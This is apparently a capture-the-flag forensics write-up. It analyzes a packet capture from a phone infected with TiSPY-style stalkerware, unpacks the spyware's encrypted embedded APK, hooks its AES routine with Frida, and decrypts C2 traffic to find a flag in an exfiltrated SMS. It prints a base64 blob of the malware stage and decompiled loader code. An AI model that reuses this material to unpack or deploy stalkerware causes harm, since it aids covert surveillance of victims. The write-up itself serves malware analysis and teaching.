---
title: "Platypwn 2025 - Stalking-as-a-service"
subtitle: "SOFTWARE INTENDED FOR LEGAL USES ONLY” This seems to be the notice that renders hacking tools legal. Your local women’s shelter knows about the use cases of such software. They captured the network traffic of the mobile device of a victim of digital violence in relationships and seek technical aid in analyzing it. Can you help them?"
excerpt: "SOFTWARE INTENDED FOR LEGAL USES ONLY” This seems to be the notice that renders hacking tools legal. Your local women’s shelter knows about the use cases of such software. They captured the network traffic of the mobile device of a victim of digital violence in relationships and seek technical aid in analyzing it. Can you help them?"
date: 2025-11-16
categories: [forensics]
tags: [wireshark, frida, jadx, apktool]
ctfs: [platypwn25]
author_profile: true
sidebar:
  nav: "docs"
header:
  overlay_color: "#000"
---

# Recon

We have the following *pcapng* file : 

```
network.pcapng.gz: pcapng capture file - version 1.0
```

We can see in the protocols hierarchy that the capture mostly contains *HTTP* requests that are mostly done to odd URLs, which for some of them mention `TiSPY`, an infamous *Android* spyware :

> https://tria.ge/s/family:tispy
> https://tispy.net/

Also, we can see an interesting *apk* file in the objects intercepted over *HTTP* : 

```
platySpy/platySpy.apk: Android package (APK), with APK Signing Block
```

In the numerous *HTTP POST* requests captured, some seem to embbed encrypted *XML* data, which is mostly sent towards the following URL : 

```
POST /TiSPY/servlet/hrh?imei=029183d93966426cbd25fd20fdbd3cdd&type=event&dataenc=true HTTP/1.1 
```

So, according to the challenge description and the global informations we found in the capture, we can assume the victim's phone as been infected with the `TiSPY` spyware. As a first intuition, we can imagine the flag is located in some data from the victim's phone that could have been extracted by the spyware and *POST*ed on the C2. The data being encrypted, the goal might be to analyze the spyware to try decrypting the payloads.

# Investigations

First of all, we decompile the *APK* :

```
~# apktool d platySpy.apk
```

The application is heavily obfuscated and it is difficult to find any point of interest (*Cipher*, *HTTP*, etc..). But looking at the hardcoded strings of the application, we notice a base64-encoded archive, and more specifically an *apk* archive embedded in the strings of the application (`res/values/strings.xml`). Let's decode it :

```python
import base64

raw=b"""UEsDBBQAAgAIAMArIQD6zgDG3hEAAKgjAAALAAAAY2xhc3Nlcy5kZXiNWgtwW8d1vfse/gRJ8FHi ByLFR1AmoR8BSZStX2RRP5c2SH1Iy7YUxwaBRxIW9AACoCQ6Ti07Suw4apy6thPnV6dNO0qbtJ7Y nfFM7Iw7zUyc1s50Yk1GbZRpmqZOmzpT51O7njRVz91dgo/6dELOeXf37t3du3fvvbsPQN45HUlv 2kzhB/auXtn05p+/ePcbP/2L5IE15rtfn9tJy94530dUJqLTR4Ys0n/LwPsjUvzNwH8bRNtAXzOJ WkDPBoiKoNEgURi0GCHq6iA610B0oZPoe8CbwHuAEScKAU1AO5AENgLbgJuBMeA4UAG+CvwV8CLw A+CfgTeBt4D/BH4BvAP8GrgMmCswNtAItAI2MAAMApuBHcAe4FbgEHAnUAU+BTwPfAv4IfA2EO0i 6gO2AYeAKWAeeAL4MvAN4IeA2Y11AGuB/cBRYBY4B3wVeBX4MfAeEFtJtArYARwG8sAHgc8DrwDf Br4LXAT+CfgR8BPgP4CfA+8B/wv4erBOoAFoBlqBAeBmYAIoAEVgFpgHzgLngMeBJ4BngPPA3wFv ABeBfwUCNvYPiAEdQA+QBNYDO4ERYBy4GzgBPAg8DnwReAH4a+A7wD8C/wL8Avg1EOkl6gQSQBJI AzuBW4BDwAxQBk4CDwAfAZ4GzgPPAS8DfwN8G/gOcAl4E3gXoAT0BhqAOGADa4EhYCdwC3ArEIPo cgDmIyyVoBbp7gT3plXADUA/MAAkgdXAGmAtsA5YDwwCKSANbAA2ApuAIR0bNwI3AVuAraTiZDuw A3gfsBO4GdgFDAO7gT3AXmAfsB+4BfgdYAQYA44AdwJ3AUeBY8D7Sa1p4a9V02cRd8t0+TzKC0H8 Qodav9D1No5XT3lhrLge66UOxW/z8Ns8/HbNZ4qwpm9qfpfmd2m8Bv4KXb7Qocbh8qWORZkfe/hv 6XG69TgduvyrDjUP79//aPmVepyF8ku6zHvq61Tj8d5GOxW/T8t06/1e1rlYtrU8l9d1Kh1We9a+ RusW1/7A44xpf+C/A7o8hL4HdXmHp7wX5XFdzqA8ocsTHv69HvkZj0zZI/MAyod1+ayH/6RH/nOe cVjPBZlnPeXzHpnnUL5dl19E+ZAuv+IZ/7VO5Ycpvd47dPmS3q+0x1Zpz15s8thtSPNxfNDdpOik pjnAxG4w30d+SQPYSUXbpFxQ10OahjWNYEZF1XiNwG0y3pfL8nL0z0g/VbQHEfIHcl4bYykaljRB H5d6KL6p+Sai6G5JOzSNa7pC06Sm6+pyk1puUq5HjeODR3G7H1qpdQ1IfkDXg7oe1PWQrod0Pazr YV2PaD0jyFyqfpOkDZihImmE5iQN0P0y3rfSY5IG6QnQJmSD45IadfqszAWr5DwxZDxFBzUdIkfT aU1PSGrRrKYfkjRAv6vrD0rqo49p+ceJ7wx9crwW6J/X1JV0I32ROGdZ9ICmX5D5SMktgz6fknko TCVJQ3RS0nY6JWknnZa0i+YlteiMlntI5pKUnLdDj9+BcZ+WftFAfyh9V613haZdet+60L8m89CN VJX0Jk1JrqsbGn5O5iAlv1L3XwmN75F0uaZtmqp19SCr3CvPoSb6pMxbLZpuoM/IfNUs71x9sNtH JF1Lz0iq2lfBomclVe2rNL9f69GPuFC0mx7RZ9tnJd1Cn5fn3ErKyjw3RA9LGqXfl7luM31A0iH6 qM59n5V5r4c+KGkvfVieif1y/HV6f9bB4z8tz8lNOp7UebNwJlzGH9NDCVU3Sd0fr2w/rtt9+ly6 sv2PdbufZPBc1f68bg94+n+6Y7H967o9eJ3213V76DrtP9Dt4eu0/0y3R66zvt/oduE5v5uln79z meOKfeIi0WPTkMBZLKZhySYpL+p92Dbl2F4ZtRFwTfgw//0X4MZWQLcoxSHs2iuhY9TsTb+PPkEJ Xz96HUPv3s0WCWPz4S/gxmEabozvGxHRGmimoWyWEoEYJcRKyN6Ksd1YN48XdO1RxHlUxIN+jDsm y27sACSiIhFU0kHZEoR0POST5Ue4J6SYV07fQG2oDWBv3FgSz4jYKvo95SjKa1HmkQfl3P2oWUKv CTr08EhiNt0J33VjmyGzRfh1qWLn4IkXyRDCSD7RCE2LaBmSGs7aNvJE8vuNyi4xvoVFjVlcRjn+ wA0yl8+raIi5j2Dcf7isxk1eaKTkdxs9Mw1QJebAjhHc6n50OUHXsJfB9uplexkBaYlej73KNkcv r5vkunncQbl3XdwX6wuT8CVfYG2DV2ib/DK0+XijSH5D+cIUPHVKxpOg+6RHRGW+5/P0Q9IHQzJ+ w8g/f6rPs7+UtJe+Jv0qRM/Lu2wn/UTKhShkWGdFx+OC8aD1GfEVlP5MEJM3gZ8DvxTahxd8UuVK E9rukKdMAeX/z2+9/m/Ks9uU8WLC3w1ajPFZu4FtJ9t8aDW9beko9ZpXt4WlLfexraWMrWWaIOHX Mpf4jNlmrbY6rGAllocPRHBCvoH4i1KraKWh2N/iTHhKzt8AnmtP0HPYhYSpogjnuyiomLLfTxdU P387DR3ch36foL4/2UBdgTU0GvAHuxBRoCFdD8+mQ2T4o5DZRKM+f3A06g+Nmv6wm76TbPB7kENn 0xHslBv7AGZiP/soynejHBWVWBYriyCP3wA/nJSr7OFbhw86+XnFCdwGkz+L0+9pLfqv0KJ/iRbJ l+PwHF6nQVEfr3OVHHEj7LGprkEf6q59D2sg29z0EcjFcUb1PbSBJo1mGjVEkMc0EccJ0UFxA2f9 WawkNsxR6x/1+4K8wrRP6VtO78TODgg9g+j1P3eor0XN0rowr783MHvkIJUPBWPJb83aTfR97GLY s498T7f8rP1JGXUT8CRlQfYAklG3RUZdr9l79rk9s/YhnJRR0SM2wXdmxw/SQbyG9n6YS3cKXtWk aJL+xX6ovHSn9ide+xbkEdfehnc4Hvl23gljK2Lcslz7DqynRTSC/z4ZA8mfJmAhzg1x2Kds34Z2 zgXDMi8IT16QY9dzxmKe2I08MSDPMo4YIeLLA9LPlV78jhhMS43S22mXn3vetUSjo9fQaIXW6Nar NDLqGs3G7oUFvFnst9F2j9RWxbPSd4XFui5EdI+OfwNWmYJf3CT3J4H1le0Y+h6zfTIbJ+AvZdsC J/ku10KoLePa2yq2/RjTktSHbL+iRazgW51Rt8urfJ8TT6FfDH4d4DNQcJm9A5r6En4f9GhE/9PC QWaIiL62TThnRGtvdnPr0+hbhvX6EhvICk6G4NkhIxiCHHt3zIgKboN8kD0blggttLN3C4N9K0Zd 2PF48BxZW/oexTjhrkg3jUZCYauzXlo9GWmWpdl0kCqhqDFxh4+skLW17xmMHnFj61jbhtGGcMSK 88nINTe2hmk00ahOnEaymvgEj1Kk+WJz82/c9Ai91RyN8m69Drl444zcuUso805FZd8Yoq+PXo7y HI0Lc6yxGnhFDbrOq3k4HDV6sJJKupnasbJRETAvChOWWk3HL3MG5Dy1LIBdE7MyJqNG3GySOWij iIsndXvy7a/pfYMPvyjk/Wwxz8sYbmXP8MEzHl3wDDq2C16c5huvJboMZC8E5MRwgEZx5bF6u2TO IeHaW9lXIe2niV18OxnH3bdJ3uEWzwT2vYmDfrI29LXAusZoQBiWlTDDNDHB/tdGe8jyuel2yvmi 5qiJ1sRoUMDLD7P/yPPDq3OvR+crdezC/l9PxyB0DHp0DMgTb/FznAn4Ql1HH+son4lR//V16ffq smupLpzNFnRRHGvD1VqFoFWorlXQoxN/BsNt1rDWyc86TZqNpG3E9Y1szUXtvLq1e3TrS3s1W5wd ewBc2yaN0iZhsloWbeK1g/ce0SZtGMJZlYZN+AZewLMV74HT8GqMbAp5r/9Sw6tD33vql63sHz49 E79TzsbifFIhP65HfowgRo4jnuMYYzY2JT3SSrjpabJFQrTAZ1K4hSaMdZCbocO8ez6e2bXvw5gR c5u5nD1q10YSQ8l3rrjL4T6KzBvbJTOlG9sgb45p+dxMfB8sYIxJfbOMGw0LuTq2mu/HxkIujhum Jy+vR1uD4aYzfCuq52XXvpFz5+vKRuvB2yHvexyLHYM++f6grMj331bsTlyed+qtYHPvMu/tFnMJ eRsaw0r5vn5AnSv/bgnuydkHGRJrHYXMLXqXGvVK3dh+eYYm31Xvh/1KhzVC3+cM+T7dLWOWqa33 N61pt2e/Dfn+1Sxpm+dd05B0k6xv0nXy3FWF/uxWyam52kA36HOrS5eVLht0/xtkvwbdP1afX/Vv lSXFa6W1UqZNj9eOtjW6rR0lv+fzUarr0VWfe1N9bluOk9RzpvR4aU+/tJy1yXZLNXuqNOfm7YJr U4t9qlCbscvZSvaEU3MqVZuC6+xq4X5nG/kG7y+UyZfKO6cpmCrN1bjQvGN0frhcLhZy2Vqh5O6k 0I5cseAWajspsENRc3jfODXudaq1gj1VKDrbcANase90zilzD572RPa4s9c5va/onHDcGvn3D2fG 99HW/VlI59HH5YdTzNsD+bpUdcDO1mrOCQziTtsD5Wxtpt5Cgf1SnMQI9Y2kDthOfbb8XIXlr5jR GMmQOZLJkA+PDAm4a4aMzAiZmZERFG4FIJGRHBbL8LMhk03tKbk153RtO/lRySoyqUhOkbwijiJT ikwrMrOdOjNZN18pFfKpHA/l1haHTFzVVHGqqeFq1amNZt3stFPZTvG6TKma2j1XKOZXHdl3eHzk wNh2suptc7VCMZUpYdb2TD5bPFk4nqrOV2G9FIywH1beTk2Z+7Ins6lCKaXq8SX1A3O18lxtvFZx sie20/J628iB+kYuYbvXlD4I29fZrYpdzLrTqd2lUtHJYogWD3NPMVutssZXsDKlbJ6XvtzT4NHC O+4IzCbNZHuYY6XxudyM9BBPt96rJEad2kzJK2J5RA5M3ufkakt5WBl8i7f0Sp7cGNZjibjcgaXr mJiplE5lJ3kDvKNUnKkipksNVyrZ+e3Uc40meE21VpnL1UqVa/eVC67v65ImtdK66apODlFSm0/d 5szX1ZMuJOfPFKqLC19kY6vaPLw9pSKPLQ23zMMfQVbJSiVjHq4aU011OpWrzJdrpdSeQnlmcfOu YC9xsd6lEtWyk0uNO7mKU8MSxlHbTkG1SOSz8b233TMyNkG+ibvwvu2/fWL/erzkHSHzCLKAcQTR fYSjPoAnU/NIRrIy3HiUxFEyjqJ4bDdZx6721rZj1/HKY9dwniXMBe8RWTKz+TwFsuWy4+YpnGXr 5krlebCqbChczEjkyJ8rlqoONWKZ2Zoz5pziQKVeFd+DKr4HEd8HkRq526qFbBfIO0UkdzI5gTd4 Uir1eCrjc+Uy8k3VWQyBKuGVx+9UKqUKBZzTGLNK/qniXHWGglOlyhjODDKnnRo14zE8WS0V52oO T09hZnDiqlIIxd3zNUeVpNmoaaGkYptiXC+dKJdcaDIxX3aUxKKLS4m9Tq6YrTh56dnU4uGovaYG sNgo1b2FiqyMYICsm3MogsooFockSkGUpeqNKBxEd1d2knypPPPHCyfKRacuBuM4lZzUPTiTrY4h X5OPjzsKFNyTpeMORQvV4VwOUxQmeaxCdR+OqnkKFbT/03Le+kH2fj5XB48WynLWQNFxpzGpr8g7 7SvCIBTk514+bZeeW1WKMeOg5+yjwInj+UKlSg2uc6q+XJ8rFSzBocjEyU1R73lJobJ2EWouqxSd zR2fqGTRMygZRZd88LI8mdhCasTDszYfXw8oXJ2brEoXpmCtJDMChWqlcc06mS3OOQemSJwi/ykk F0e9XkUE/unRM75z7eKhM76X2kX4Qjt/QGXGTXD/vks8fMb3qy7xqH2uG48v8eOVbvExcalbhM+s RO3VXhH5SkI8Jr7Zh/s2+axG7rFKhC7xt/Ki+SFc2g0h/JYwYmcwz+qWlrdX4+YogpaF+itrWlue XMv1kLUM9dfWLm85v47rYasN9X9b195yfj1/PBCJi0gHdLqwXoQ/OSgiT6br34MLD134vYvh+c2L SYu/e/HR4m9f+D638PuXAC3+BkbY6ntP/h0MXgfl98/8PYFhq/H5tzF8wQ0vfCcSU3Pz723+D1BL AQIXAxQAAgAIAMArIQD6zgDG3hEAAKgjAAALAAAAAAAAAAAAIAC2gQAAAABjbGFzc2VzLmRleFBL BQYAAAAAAQABADkAAAAHEgAAAAA=""".replace(b" ", b"")

with open("output.apk", "wb") as f:
        f.write(base64.b64decode(raw))
```

By using *JADX*, we decompile the embedded *APK* and find a dynamic dex loader in it : 

```java
// p000a.Context
public static void load(android.content.Context context) {
        try {
            String[] list = context.getAssets().list("");
            if (list.length > 0) {
                ArrayList arrayList = new ArrayList();
                for (String str : list) {
                    if (str.length() >= 15) {
                        File file = new File(context.getFilesDir() + "/dex", str + ".zip");
                        file.delete();
                        if (!file.exists()) {
                            if (!file.exists()) {
                                file.getParentFile().mkdirs();
                                try {
                                    file.createNewFile();
                                } catch (IOException e) {
                                    Log.e("error", e.toString());
                                }
                            }
                            InputStream inputStream = null;
                            try {
                                try {
                                    inputStream = context.getAssets().open(str);
                                    C0007h.m10a(inputStream, file, str);
                                    inputStream.close();
                                    if (inputStream != null) {
                                        try {
                                            inputStream.close();
                                        } catch (Exception e2) {
                                        }
                                    }
                                } catch (Throwable th) {
                                    if (inputStream != null) {
                                        try {
                                            inputStream.close();
                                        } catch (Exception e3) {
                                        }
                                    }
                                    throw th;
                                }
                            } catch (IOException e4) {
                                Log.e("", e4.getMessage(), e4);
                                if (inputStream != null) {
                                    try {
                                        inputStream.close();
                                    } catch (Exception e5) {
                                    }
                                }
                            }
                        }
                        arrayList.add(file);
                    }
                }
                try {
                    if (arrayList.size() > 0) {
                        File file2 = new File(context.getFilesDir() + "/outdex");
                        if (!file2.exists()) {
                            file2.mkdirs();
                        }
                        C0000a.m4a(context.getClassLoader(), file2, arrayList);
                    }
                } catch (Exception e6) {
                    Log.e("<MyApplication>", e6.getMessage(), e6);
                }
            }
        } catch (Exception e7) {
            Log.e("", e7.getMessage(), e7);
        }
    }
}


```

This dynamic loader looks into the `assets/` folder of the application for files with a name longer than 14 characters, it creates a file with the same name and the *zip* extension in the `dex/` folder of the application, and finally it writes the output of the `C0007h.m10a` function in it, whose code is the following : 

```java
// p000a.C0007h
public static void m10a(InputStream inputStream, File file, String str) {
        try {
            SecretKeySpec secretKeySpec = new SecretKeySpec(m11a(str), "AES");
            Cipher cipher = Cipher.getInstance("AES");
            cipher.init(2, secretKeySpec);
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            CipherInputStream cipherInputStream = new CipherInputStream(inputStream, cipher);
            byte[] bArr = new byte[1024];
            while (true) {
                int read = cipherInputStream.read(bArr);
                if (read < 0) {
                    fileOutputStream.flush();
                    fileOutputStream.close();
                    inputStream.close();
                    cipherInputStream.close();
                    System.out.println("Desti file: :" + file.getAbsolutePath() + ", size:" + file.length());
                    return;
                }
                fileOutputStream.write(bArr, 0, read);
            }
        } catch (Exception e) {
            Log.e("<MyApplication>", e.getMessage());
            e.printStackTrace();
        }
    }
```

This function is a simple decryption function that uses *AES-ECB* to decrypt a file input stream and write it into the provided output file. So now, given the key is the name of the file, we are able to decrypt the hidden *APK* located in the `assets/` of the application. There is a single file that corresponds :

```
assets/BRvZBcNJseqSkWbxN: data
```

We decrypt it using the same method as the application : 

```java
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;

public class AESDecrypt {
    public static void decrypt(File inputFile, File outputFile, String key) throws Exception {
        SecretKeySpec secretKey = new SecretKeySpec(key.getBytes("UTF-8"), "AES");

        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);

        try (InputStream fis = new FileInputStream(inputFile);
             CipherInputStream cis = new CipherInputStream(fis, cipher);
             FileOutputStream fos = new FileOutputStream(outputFile)) {

            byte[] buffer = new byte[1024];
            int read;
            while ((read = cis.read(buffer)) != -1) {
                fos.write(buffer, 0, read);
            }
        }
    }

    public static void main(String[] args) {
        try {
            File encrypted = new File("assets/BRvZBcNJseqSkWbxN");
            File decrypted = new File("decrypted.zip");
            String key = "BRvZBcNJseqSkWbx";
            decrypt(encrypted, decrypted, key);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Now, we got deeper into the obfuscation, let's decompile the freshly retrieved *APK* with *JADX* to see what it does exactly. This *APK* is way more interesting that the previous ones, there is a lot of mentions of cryptography and *HTTP*-related function/libraries.

By searching for `cipher.init(1`, i.e. an encryption statement, we find this rather interesting function, that simply encrypts a string with the provided key using *AES* : 

```java
// com.dkpxkmmz.rqnkjsmr.smhl
public static String zomg(String str, String str2) {
    try {
        SecretKeySpec secretKeySpec = new SecretKeySpec(smhl(str2), "AES");
        Cipher cipher = getCipher();
        cipher.init(1, secretKeySpec);
        return Base64.encodeToString(cipher.doFinal(str.getBytes()), 0);
    } catch (Exception e) {
        return djkl.kizx;
    }
}
```

Using *Frida*, let's hook it to retrieve each data-key-ciphertext combo : 

```javascript
Java.perform(function () {

    var DexClassLoader = Java.use("dalvik.system.DexClassLoader");

    var hookedSmhl = false;

    DexClassLoader.$init.overload(
        "java.lang.String",
        "java.lang.String",
        "java.lang.String",
        "java.lang.ClassLoader"
    ).implementation = function (dexPath, odexDir, libPath, parent) {
        console.log("[+] DexClassLoader initialized:", dexPath);
        var loader = this.$init(dexPath, odexDir, libPath, parent);
        setTimeout(function () { tryHookSmhl(); }, 50);
        return loader;
    };

    function tryHookSmhl() {
        if (!hookedSmhl) {
            try {
                var Smhl = Java.use("com.dkpxkmmz.rqnkjsmr.smhl");
                var zomgOver = Smhl.zomg.overload("java.lang.String", "java.lang.String");
                zomgOver.implementation = function (a, b) {
                    try {
                        console.log("[smhl.zomg] a:", a, " b:", b);
                        var out = zomgOver.call(this, a, b);
                        console.log("[smhl.zomg] out:", out);
                        return out;
                    } catch (e) {
                        return "";
                    }
                };
                console.log("[+] Hooked smhl.zomg");
                hookedSmhl = true;
            } catch (e) {}
        }

        if (!hookedSmhl) {
            setTimeout(tryHookSmhl, 200);
        }
    }
});
```

On one of the function call, we get the following output : 

```json
[smhl.zomg] a: {"type":"auth","frname":"sdk_gphone64_x86_64","name":" ","birthdate":"1700257632882","user":"johndoe@mail.com","pass":"azerty","imei":"292996789012345","imei_type":"IMEI","time":"1763416054257","timezone":"Europe\/Paris","mynumber":"+15551234567","family":"1","model":"sdk_gphone64_x86_64","osversion":"31","addusr":"true","version":"3.2.183_12Aug24","rtype":"T","roottype":"0"}  b: bNSK64HldknUYexP
```

So this *JSON* payload was encrypted used the following key : `bNSK64HldknUYexP`. The message being of type *auth*, we can suppose this payload corresponds to the one sent to register/authenticate at the application startup, i.e. these requests : 

```
33379	290.044146	127.0.0.1	127.0.0.1	HTTP/JSON	897	POST /TiSPY/servlet/hrh?imei=029183d93966426cbd25fd20fdbd3cdd&type=auth&dataenc=true HTTP/1.1 , JSON (application/json)
33410	301.171817	127.0.0.1	127.0.0.1	HTTP/JSON	897	POST /TiSPY/servlet/hrh?imei=029183d93966426cbd25fd20fdbd3cdd&type=auth&dataenc=true HTTP/1.1 , JSON (application/json)
```

We decrypt their payload using the freshly acquired key : 

```python
from pwn import *
from Crypto.Cipher import AES
import base64

d1 = base64.b64decode(b"""n9+965zlCTVS+3+mrdBKu66IdFkkxgVBzDA7pu7URScV5sgdJGr/VXsClC4vZcBx0H6aH3cBKarT
VdkSGi9/T2/Owy6hkafj2tYvuQtT04sR2UQUVes4gK/eGNMJYSeIoINQDakrSowt2IbdexwaleES
IeAdBjJ0e+r++iyzphg9f208aL5weERwqG5ch0HUIVe2Zx/qCAhr+H/KKA0lnFlvFnXxM/i0LvAH
rGHVNHDYDVqPSmcByDG/Ys6ryKx7i62okYtz+HlWUwxXLyGfJz8tUGujehF9O8Z9l7FXJ6LoHu5S
3RtNpbVDptDTN7wfJd22HCp5IRvqJFzHzRqYc42xhPxKMwuMf5uyF1gwniRZpo4SzGnEQ4w4DA9U
dSQ7QQC4DaE5DSJu7222sbkF1Lb17CCKMlchblv1CNiJ3VKfZrdVyUMVyewnqcTL7ErLLSZqBbIJ
DyTiFi1qAHrxJYXE5HJjglxHcdnFylT4ibhs2j62JfixIoURsT8zxYA4
""".replace(b'\n', b''))

d2 = base64.b64decode(b"""n9+965zlCTVS+3+mrdBKu66IdFkkxgVBzDA7pu7URScV5sgdJGr/VXsClC4vZcBx0H6aH3cBKarT
VdkSGi9/T2/Owy6hkafj2tYvuQtT04sR2UQUVes4gK/eGNMJYSeIoINQDakrSowt2IbdexwaleES
IeAdBjJ0e+r++iyzphg9f208aL5weERwqG5ch0HUIVe2Zx/qCAhr+H/KKA0lnFlvFnXxM/i0LvAH
rGHVNHDYDVqPSmcByDG/Ys6ryKx77q2z7v4R1z2Dnem112I5BT8tUGujehF9O8Z9l7FXJ6LoHu5S
3RtNpbVDptDTN7wfJd22HCp5IRvqJFzHzRqYc42xhPxKMwuMf5uyF1gwniRZpo4SzGnEQ4w4DA9U
dSQ7QQC4DaE5DSJu7222sbkF1Lb17CCKMlchblv1CNiJ3VKfZrdVyUMVyewnqcTL7ErLLSZqBbIJ
DyTiFi1qAHrxJYXE5HJjglxHcdnFylT4ibhs2j62JfixIoURsT8zxYA4
""".replace(b'\n', b''))

key = b"bNSK64HldknUYexP"

print(AES.new(key, AES.MODE_ECB).decrypt(d1))
print(AES.new(key, AES.MODE_ECB).decrypt(d2))
```

Which returns the following object (the two request are the same, only the timestamp differs), thus meaning the key is indeed hardcoded and the same for everyone : 

```json
{"type":"auth","frname":"Jackie","name":"","birthdate":"1762004205944","user":"niklas@trustmail.com","pass":"Nik1995","imei":"029183d93966426cbd25fd20fdbd3cdd","imei_type":"adID","time":"1762522669354","timezone":"GMT","mynumber":"+15555215554","family":"1","model":"sdk_gphone_x86","osversion":"30","addusr":"true","version":"3.2.183_12Aug24","rtype":"T","roottype":"0"}
```

Knowing that, we can also try to decrypt the server response, which is also encrypted : 

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?><Response code="200" message="RZP5ci/OvTmRl4KHIK8pp1o5de4ZVk+WhxToYoWC44LIIbuUftlaGvo2AEyHv6L9"/>
```

Using the following script : 

```python
import base64
from Crypto.Cipher import AES

key = b"bNSK64HldknUYexP"
data = base64.b64decode(b"RZP5ci/OvTmRl4KHIK8pp1o5de4ZVk+WhxToYoWC44LIIbuUftlaGvo2AEyHv6L9")

print(AES.new(key, AES.MODE_ECB).decrypt(data))
```

The server's encrypted response contains a status code and a `datakey` : 

```
{"status":200,"datakey":"d8c74310e88c45c"}
```

The name of the key being quite equivocal, we can directly try to decrypt the encrypted data sent to the C2. We first extract all the bytes into a single file using *tshark* : 

```
tshark -r network.pcapng.gz -Y 'http.request && http.content_type contains "xml"' -T fields -e xml.unknown > transiting_data.txt
```

And then, we try decrypting the payloads : 

```python
import base64
from Crypto.Cipher import AES

key = b"d8c74310e88c45c"

with open("transiting_data.txt", "rb") as f:
        data = f.read().replace(b'\\n', b'')
        data = data.split(b'\n')

for ciphertext in data:
        decoded = base64.b64decode(ciphertext)
		# there is a character missing in the datakey returned by the server
        for guess in [b'1',b'2',b'3',b'4',b'5',b'6',b'7',b'8',b'9',b'a',b'b',b'c',b'd',b'e',b'f']:
                try:
                        print(AES.new(key+guess, AES.MODE_ECB).decrypt(decoded).decode())
                except Exception:
                        pass
```

Knowing there is a character missing in the `datakey` returned by the server (it is only 15-bytes long, 16 are required for AES-128), we bruteforce the last byte during decryption.

Finally, in one of the SMS sent by the spyware to the C2, we find an interesting message (packet n°35591 / tcp stream 183) : 

```
<Request  type="Event" ><SMS  time="1762523197938"  name=""  number="6505554221"  content="Platypwn+2025%0A15.11.2025+-+16.11.2025%0Ahttps%3A%2F%2Fplatypwnies.de%2Fevents%2Fplatypwn%2F%0APP%7Bd154rm_p47r14rchy%7D"  type="1"  block="false" ></SMS></Request>
```

Which, once decoded looks like this : 

```
Platypwn 2025
15.11.2025 - 16.11.2025
https://platypwnies.de/events/platypwn/
PP{d154rm_p47r14rchy}
```

We got the flag.

> PP{d154rm_p47r14rchy}
